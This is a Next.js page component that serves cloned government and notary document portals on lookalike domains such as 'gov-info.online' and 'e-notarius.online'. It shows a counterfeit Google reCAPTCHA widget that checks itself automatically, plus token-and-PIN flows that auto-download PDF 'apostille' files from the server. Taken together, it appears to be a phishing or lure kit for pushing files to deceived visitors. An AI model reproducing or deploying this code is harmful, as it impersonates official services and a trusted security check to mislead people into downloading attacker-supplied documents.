import { Suspense } from 'react'
import fs from 'node:fs/promises'
import path from 'node:path'
import Script from 'next/script'
import { headers } from 'next/headers'
import { redirect } from 'next/navigation'
import VerifyForm from './verify-form'

async function ThirdPageContent() {
  const htmlPath = path.join(process.cwd(), 'public', 'third-page', 'index.html')
  let htmlContent = await fs.readFile(htmlPath, 'utf-8')
  
  const bodyMatch = htmlContent.match(/<body[^>]*>([\s\S]*)<\/body>/i)
  let bodyContent = bodyMatch ? bodyMatch[1] : htmlContent
  
  bodyContent = bodyContent.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
  
  return (
    <>
      <link rel="icon" href="/third-page/images/favicon.ico" type="image/x-icon" />
      <link href="/third-page/css/materialdesignicons.min.css" rel="stylesheet" />
      <link href="/third-page/css/app.c816d106.css" rel="stylesheet" />
      <link href="/third-page/css/chunk-vendors.0014bfcb.css" rel="stylesheet" />
      <Script src="/third-page/js/api.js" async defer />
      <style dangerouslySetInnerHTML={{
        __html: `
          #recaptcha-container {
            min-height: 78px;
          }
          .fake-recaptcha {
            display: inline-flex;
            align-items: center;
            padding: 0;
            border: 2px solid #d3d3d3;
            border-radius: 2px;
            background: #f9f9f9;
            cursor: pointer;
            user-select: none;
            font-size: 14px;
            font-family: Roboto, Helvetica, Arial, sans-serif;
            box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
            transition: border-color 0.2s, box-shadow 0.2s;
            width: 304px;
            height: 78px;
            position: relative;
          }
          .fake-recaptcha:hover {
            border-color: #4285f4;
            box-shadow: 0 0 0 1px rgba(66,133,244,0.5);
          }
          .fake-recaptcha.verified {
            border-color: #0f9d58;
            background: #f9f9f9;
            box-shadow: 0 0 0 1px rgba(15,157,88,0.5);
          }
          .fake-recaptcha-checkbox-wrapper {
            display: flex;
            align-items: center;
            padding: 8px 8px 8px 8px;
            height: 100%;
            width: 100%;
            box-sizing: border-box;
          }
          .fake-recaptcha-checkbox {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            margin-right: 12px;
            vertical-align: middle;
            position: relative;
            background: #fff;
            transition: background-color 0.2s, border-color 0.2s;
            flex-shrink: 0;
            box-sizing: border-box;
          }
          .fake-recaptcha:hover .fake-recaptcha-checkbox {
            border-color: #4285f4;
          }
          .fake-recaptcha.verified .fake-recaptcha-checkbox {
            background: #0f9d58;
            border-color: #0f9d58;
          }
          .fake-recaptcha.verified .fake-recaptcha-checkbox::after {
            content: '';
            position: absolute;
            left: 7px;
            top: 3px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
          }
          .fake-recaptcha-text {
            color: #202124;
            font-size: 14px;
            line-height: 1.4;
            font-weight: 400;
            letter-spacing: 0.2px;
          }
          .fake-recaptcha-logo {
            margin-left: auto;
            padding-right: 8px;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            justify-content: center;
            height: 100%;
          }
          .fake-recaptcha-logo-container {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
          }
          .fake-recaptcha-logo-svg {
            width: 24px;
            height: 24px;
            margin-bottom: 2px;
          }
          .fake-recaptcha-logo-text {
            font-size: 8px;
            color: #555;
            line-height: 1.2;
            font-family: Roboto, Helvetica, Arial, sans-serif;
            text-align: right;
          }
          .fake-recaptcha-logo-text-link {
            color: #555;
            text-decoration: none;
          }
          .fake-recaptcha-logo-text-link:hover {
            text-decoration: underline;
          }
        `
      }} />
      <Script id="third-page-scripts" dangerouslySetInnerHTML={{
        __html: `
          let docNumber = '';
          let docDate = '';
          let recaptchaVerified = false;

          function autoVerifyRecaptcha() {
              setTimeout(() => {
                  const fakeRecaptcha = document.getElementById('fake-recaptcha');
                  if (fakeRecaptcha && !recaptchaVerified && !fakeRecaptcha.classList.contains('verified')) {
                      recaptchaVerified = true;
                      fakeRecaptcha.classList.add('verified');
                  }
              }, 500);
          }

          function updateContentFromFileName() {
              const urlParams = new URLSearchParams(window.location.search);
              docNumber = urlParams.get('number') || '';
              docDate = urlParams.get('date') || '';
              let documentNum = urlParams.get('document') || '';

              if (!docNumber || !docDate) {
                  const fileName = window.location.pathname.split('/').pop();
                  if (fileName && fileName.includes('number=')) {
                      const [numberParam, dateParam] = fileName.split('&'); 
                      docNumber = numberParam.split('=')[1];
                      docDate = dateParam.split('=')[1].replace('.html', '');
                  }
              }

              const apostilleInput = document.getElementById('input-apostille');
              const dateInput = document.getElementById('input-date');
              const documentInput = document.getElementById('input');
              const label = document.getElementById('apostille-label');

              if (docNumber && apostilleInput) {
                  apostilleInput.value = docNumber;
              }
              if (docDate && dateInput) {
                  dateInput.value = docDate;
              }
              if (documentNum && documentInput) {
                  documentInput.value = documentNum;
              }
              if (docNumber && docDate && label) {
                  label.innerText = \`Apostille No \${docNumber} from \${docDate}\`;
                  label.onclick = function(e) {
                      e.preventDefault();
                      window.downloadPdf();
                      return false;
                  };
                  label.style.cursor = 'pointer';
              }

              autoVerifyRecaptcha();
          }

          window.onFakeRecaptchaClick = function() {
              const fakeRecaptcha = document.getElementById('fake-recaptcha');
              if (fakeRecaptcha) {
                  if (fakeRecaptcha.classList.contains('verified')) {
                      fakeRecaptcha.classList.remove('verified');
                      recaptchaVerified = false;
                  } else {
                      fakeRecaptcha.classList.add('verified');
                      recaptchaVerified = true;
                  }
              }
          };

          window.downloadPdf = function() {
              if (!docNumber || !docDate) {
                  alert('Please fill in the apostille number and date first');
                  return;
              }
              const pdfUrl = \`/api/third-pdf?number=\${encodeURIComponent(docNumber)}&date=\${encodeURIComponent(docDate)}\`;
              const link = document.createElement('a');
              link.href = pdfUrl;
              link.download = \`Apostille_No_\${docNumber}_from_\${docDate}.pdf\`;
              document.body.appendChild(link);
              link.click();
              document.body.removeChild(link);
          };

          function initEventListeners() {
              const fakeRecaptcha = document.getElementById('fake-recaptcha');
              if (fakeRecaptcha) {
                  fakeRecaptcha.addEventListener('click', window.onFakeRecaptchaClick);
              }
              
              const findBtn = document.getElementById('find-btn');
              if (findBtn) {
                  findBtn.addEventListener('click', window.downloadPdf);
              }
          }

          if (document.readyState === 'loading') {
              document.addEventListener('DOMContentLoaded', function() {
                  updateContentFromFileName();
                  setTimeout(initEventListeners, 100);
              });
          } else {
              updateContentFromFileName();
              setTimeout(initEventListeners, 100);
          }
        `
      }} />
      <div dangerouslySetInnerHTML={{ __html: bodyContent }} />
    </>
  )
}

async function FirstPageContent() {
  const htmlPath = path.join(process.cwd(), 'public', 'first-page', 'index.html')
  let htmlContent = await fs.readFile(htmlPath, 'utf-8')
  
  const headMatch = htmlContent.match(/<head[^>]*>([\s\S]*)<\/head>/i)
  const headContent = headMatch ? headMatch[1] : ''
  
  const styleMatch = headContent.match(/<style[^>]*>([\s\S]*?)<\/style>/i)
  const inlineStyles = styleMatch ? styleMatch[1] : ''
  
  const bodyMatch = htmlContent.match(/<body[^>]*>([\s\S]*)<\/body>/i)
  let bodyContent = bodyMatch ? bodyMatch[1] : htmlContent
  
  bodyContent = bodyContent.replace(/src="([^"]+\.(png|jpg|jpeg|gif|svg))"/gi, (match, src) => {
    if (!src.startsWith('http') && !src.startsWith('/')) {
      return `src="/first-page/${src}"`
    }
    return match
  })
  
  const scriptMatches = htmlContent.match(/<script[^>]*>[\s\S]*?<\/script>/gi) || []
  const scripts = scriptMatches.map(script => {
    if (script.includes('src=')) {
      return script.replace(/src="([^"]+)"/g, (match, src) => {
        if (!src.startsWith('http') && !src.startsWith('/')) {
          return `src="/first-page/${src}"`
        }
        return match
      })
    }
    return script
  }).join('\n')
  
  bodyContent = bodyContent.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
  
  return (
    <>
      <link href="/first-page/bootstrap.min.css" rel="stylesheet" />
      <link href="/first-page/site.min.css" rel="stylesheet" />
      <link href="/first-page/site.css" rel="stylesheet" />
      {inlineStyles && (
        <style dangerouslySetInnerHTML={{ __html: inlineStyles }} />
      )}
      <Script src="/first-page/jquery.min.js" strategy="afterInteractive" />
      <Script src="/first-page/bootstrap.min.js" strategy="afterInteractive" />
      <Script src="/first-page/yii.min.js" strategy="afterInteractive" />
      <Script src="/first-page/jquery.inputmask.bundle.js" strategy="afterInteractive" />
      <Script src="/first-page/yii.captcha.min.js" strategy="afterInteractive" />
      <Script src="/first-page/yii.activeForm.min.js" strategy="afterInteractive" />
      <Script id="first-page-scripts" strategy="afterInteractive" dangerouslySetInnerHTML={{ __html: scripts }} />
      <Script id="first-page-auto-download" strategy="lazyOnload" dangerouslySetInnerHTML={{
        __html: `
          (function() {
            function initAutoDownload() {
              const urlParams = new URLSearchParams(window.location.search)
              const token = urlParams.get('token')
              if (!token) return

              const pinInput = document.querySelector('#repopinmodel-pin_code')
              if (!pinInput) {
                setTimeout(initAutoDownload, 200)
                return
              }

              const pinTitle = document.querySelector('.control-label')
              const submitButton = document.querySelector('#submit-button')
              const helpBlock = document.querySelector('.help-block')
              let isChecking = false

              function checkPinAndDownload() {
                if (isChecking) return
                if (!pinInput || !pinInput.value) return
                
                const pinValue = pinInput.value.trim()
                if (pinValue.length !== 4) return

                isChecking = true
                fetch('/api/verify', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ token: token, pin: pinValue })
                })
                .then(res => res.json())
                .then(data => {
                  isChecking = false
                  if (data.ok && data.fileUrl) {
                    const link = document.createElement('a')
                    link.href = data.fileUrl
                    link.download = 'document.pdf'
                    document.body.appendChild(link)
                    link.click()
                    document.body.removeChild(link)
                    
                    if (helpBlock) {
                      helpBlock.classList.remove('help-block-alert')
                      helpBlock.innerText = ''
                    }
                    if (pinTitle) pinTitle.classList.remove('control-label-alert')
                    if (pinInput) pinInput.classList.remove('input-alert')
                  } else {
                    if (helpBlock) {
                      helpBlock.classList.add('help-block-alert')
                      helpBlock.innerText = 'Неправильный ПИН код'
                    }
                    if (pinTitle) pinTitle.classList.add('control-label-alert')
                    if (pinInput) pinInput.classList.add('input-alert')
                  }
                })
                .catch(() => {
                  isChecking = false
                  if (helpBlock) {
                    helpBlock.classList.add('help-block-alert')
                    helpBlock.innerText = 'Ошибка. Попробуйте позже.'
                  }
                })
              }

              if (pinInput) {
                const originalHandler = pinInput.oninput
                pinInput.addEventListener('input', function(e) {
                  if (originalHandler) originalHandler.call(this, e)
                  if (this.value.length === 4) {
                    setTimeout(checkPinAndDownload, 500)
                  }
                }, true)
              }

              if (submitButton) {
                submitButton.addEventListener('click', function(event) {
                  event.preventDefault()
                  event.stopPropagation()
                  checkPinAndDownload()
                }, true)
              }
            }

            if (document.readyState === 'loading') {
              document.addEventListener('DOMContentLoaded', function() {
                setTimeout(initAutoDownload, 1000)
              })
            } else {
              setTimeout(initAutoDownload, 1000)
            }
          })()
        `
      }} />
      <div dangerouslySetInnerHTML={{ __html: bodyContent }} />
    </>
  )
}

export default async function Home({
  searchParams,
}: {
  searchParams: Promise<{ [key: string]: string | string[] | undefined }>
}) {
  const headersList = await headers()
  const host = headersList.get('host') || headersList.get('x-forwarded-host') || ''
  const hostname = host.split(':')[0]

  if (hostname === 'davreestr-docrepository.online') {
    return <ThirdPageContent />
  }

  if (hostname === 'gov-info.online') {
    return <FirstPageContent />
  }

  if (hostname === 'e-notarius.online') {
    const params = await searchParams
    const token = typeof params?.token === 'string' ? params.token : Array.isArray(params?.token) ? params.token[0] : undefined
    if (token) {
      redirect(`/second-page?token=${token}`)
    } else {
      redirect('/second-page')
    }
  }

  const params = await searchParams
  const number = typeof params?.number === 'string' ? params.number : Array.isArray(params?.number) ? params.number[0] : undefined
  const date = typeof params?.date === 'string' ? params.date : Array.isArray(params?.date) ? params.date[0] : undefined

  if (number && date) {
    return <ThirdPageContent />
  }

  return (
    <Suspense fallback={<div>Loading...</div>}>
      <VerifyForm />
    </Suspense>
  )
}
